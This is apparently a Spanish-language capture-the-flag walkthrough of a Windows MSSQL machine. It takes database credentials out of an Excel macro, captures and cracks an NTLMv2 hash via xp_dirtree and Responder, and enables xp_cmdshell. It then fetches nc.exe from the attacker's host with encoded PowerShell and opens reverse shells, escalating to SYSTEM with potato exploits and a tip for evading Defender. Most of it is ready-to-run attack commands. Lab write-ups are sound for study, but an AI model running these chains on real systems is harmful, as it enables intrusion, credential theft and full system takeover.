# Enumeración

<img width="856" height="813" alt="image" src="https://github.com/user-attachments/assets/01448ee9-5430-4a4b-8a75-655e93904da8" />

Pillamos la tabla que contiene macros:

un .xlsm es un Excel con macros. Alguien dejó ahí un informe cuya macro se conecta a la BBDD con usuario y contraseña escritos en claro. Los extraes:

<img width="1183" height="679" alt="image" src="https://github.com/user-attachments/assets/ac49230d-2a8d-4224-8787-80d29e62d069" />
````
unzip -o "Currency Volume Report.xlsm" -d out
````
````
grep -riE 'uid|pwd|password|Driver|Server' out/
````

<img width="1916" height="291" alt="image" src="https://github.com/user-attachments/assets/3feea59e-9621-4072-b730-540c3407f6f6" />
El vbaProject.bin es la macro (el código VBA compilado.
<img width="902" height="115" alt="image" src="https://github.com/user-attachments/assets/61959cff-dd76-4e72-b442-e397329caaf6" />
````
strings out/xl/vbaProject.bin | grep -iE 'uid|pwd|pass|server|driver'
````
user:password:
````
reporting:PcwTWTHRwryjc$c6
````
````
impacket-mssqlclient reporting:'PcwTWTHRwryjc$c6'@10.129.96.229 -windows-auth
````
<img width="792" height="301" alt="image" src="https://github.com/user-attachments/assets/0de8a3ea-885c-4d33-b8f5-97b110a27c2c" />
no somos sysadmin y no podemos activarlo:
````
SELECT IS_SRVROLEMEMBER('sysadmin');
````
ejcutamos:
````
EXEC master..xp_dirtree '\\TU_IP\share'
````
<img width="1917" height="121" alt="image" src="https://github.com/user-attachments/assets/9afd0257-4656-434e-95d8-8f0e36a53653" />

<img width="1919" height="165" alt="image" src="https://github.com/user-attachments/assets/e3882e9b-8ae6-4318-a3d9-7654cc682482" />

Atacamos el password:
````
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
````

password:

````
corporate568
````
Ahora nos conectamos como ese suuario admin para ejecutar comandos:
<img width="733" height="249" alt="image" src="https://github.com/user-attachments/assets/6ce6b4e5-b90d-4f0d-a0ed-91178657b19f" />


Ejecutamos enable_xp_cmdshell
Y testeamos comandos:

````
xp_cmdshell whoami
output              
-----------------   
querier\mssql-svc   
NULL                
````
Vamos a por la shell ahora:
````
### 1 — Conectar al MSSQL con las credenciales del Excel ###
sudo responder -I tun0                                              # (otra terminal) a la escucha para capturar el hash
impacket-mssqlclient reporting:'PcwTWTHRwryjc$c6'@10.129.96.229 -windows-auth   # conectas al SQL

### 2 — Ver si puedes ejecutar comandos ###
SELECT IS_SRVROLEMEMBER('sysadmin');        # 0 = reporting NO es admin, no ejecuta -> hay que robar otro usuario

### 3 — Robar el hash de la cuenta de servicio del SQL ###
EXEC master..xp_dirtree '\\10.10.14.65\share';   # fuerza al servicio SQL a autenticarse contra ti -> en Responder cae el NetNTLMv2 de mssql-svc

### 4 — Crackear el hash ###
# pegas el hash capturado en hash.txt (todo en UNA línea)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt    # -> mssql-svc:corporate568

### 5 — Reconectar como mssql-svc (este SÍ es admin) ###
impacket-mssqlclient mssql-svc:'corporate568'@10.129.96.229 -windows-auth
SELECT IS_SRVROLEMEMBER('sysadmin');        # ahora 1 = sysadmin, ya puedes ejecutar

### 6 — Activar xp_cmdshell ###
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;   # permite opciones avanzadas
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;             # activa la ejecución de comandos
EXEC xp_cmdshell 'whoami';                                   # confirma RCE -> querier\mssql-svc

### 7 — Preparar la entrega de nc en Kali ###
# genera el base64 del comando de descarga:
printf '%s' "(New-Object Net.WebClient).DownloadFile('http://10.10.14.65/nc.exe','C:\Windows\Temp\nc.exe')" | iconv -t utf-16le | base64 -w0
cd ~/Escritorio && python3 -m http.server 80                 # sirve nc.exe   (una terminal)
nc -lvnp 443                                                 # listener       (otra terminal)

### 8 — Descargar y ejecutar nc desde el SQL ###
EXEC xp_cmdshell 'powershell -enc <BASE64_DE_ARRIBA>';                  # baja nc.exe a C:\Windows\Temp
EXEC xp_cmdshell 'dir C:\Windows\Temp\nc.exe';                         # comprueba que bajó
EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.65 443';  # reverse shell -> cae en tu listener

### 9 — Ya en la shell ###
whoami                                       # querier\mssql-svc
type C:\Users\mssql-svc\Desktop\user.txt     # USER FLAG
````

<img width="548" height="158" alt="image" src="https://github.com/user-attachments/assets/8f0598d4-8202-414f-9951-fc345cd44bb5" />

Nos pasamos gopotato:
````
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O ~/Escritorio/GodPotato.exe
````
````
####### ESCALADA: cuenta de servicio -> SYSTEM (potato) #######
# Punto de partida: ya tienes una shell como una cuenta de servicio
# (mssql-svc, iis apppool, NETWORK SERVICE, LOCAL SERVICE...)

### 1 — Ver si puedes usar un potato ###
whoami /priv
#   Busca estos en estado "Enabled":
#     SeImpersonatePrivilege        <- el que necesitas (el más común)
#     SeAssignPrimaryTokenPrivilege <- también vale
#   Las cuentas de servicio casi SIEMPRE tienen SeImpersonate -> potato.

### 2 — Preparar en Kali (3 terminales) ###
# a) herramienta + nc servidos por HTTP (en la carpeta donde estén):
cp /usr/share/windows-resources/binaries/nc.exe ~/Escritorio/
wget https://github.com/tylerdotrar/SigmaPotato/releases/latest/download/SigmaPotato.exe -O ~/Escritorio/SigmaPotato.exe
cd ~/Escritorio && python3 -m http.server 80
# b) listener para la shell de SYSTEM:
nc -lvnp 5555

### 3 — Bajar el potato a la víctima ###
# USA PowerShell DownloadFile (no certutil: suele dar "Access is denied" por Defender)
powershell -c "(New-Object Net.WebClient).DownloadFile('http://TU_IP/SigmaPotato.exe','C:\Users\Public\sp.exe')"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://TU_IP/nc.exe','C:\Windows\Temp\nc.exe')"
dir C:\Users\Public\sp.exe        # comprueba que está (si desaparece = Defender lo borró)

### 4 — Probar que te da SYSTEM ###
C:\Users\Public\sp.exe "whoami"
#   Debe imprimir:  nt authority\system   -> confirmado, ya ejecutas como SYSTEM

### 5 — Shell interactiva de SYSTEM ###
# Lanza nc COMO SYSTEM a través del potato (no uses --revshell: usa PowerShell y Defender lo capa)
C:\Users\Public\sp.exe "C:\Windows\Temp\nc.exe -e cmd.exe TU_IP 5555"
#   -> en tu listener del 5555 cae la shell como nt authority\system

### 6 — Ya como SYSTEM ###
whoami                                          # nt authority\system
type C:\Users\Administrator\Desktop\root.txt    # ROOT FLAG
````


